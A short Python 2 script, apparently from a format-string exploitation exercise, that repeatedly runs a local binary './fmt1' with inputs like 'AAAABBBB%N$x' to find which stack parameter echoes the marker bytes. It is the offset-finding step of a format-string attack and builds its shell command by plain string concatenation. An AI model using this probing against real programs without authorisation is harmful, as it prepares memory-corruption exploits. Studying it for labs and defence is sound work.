import subprocess

program = " ./fmt1 "

i = 0
while (i < 100):

	fmtstr = "AAAABBBB"+"%"+str(i)+"\x5c\x24"+"x"

	command = program+fmtstr

	p = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
	(output, err) = p.communicate()
	print "param:"+str(i)+" "+output
	i += 1	
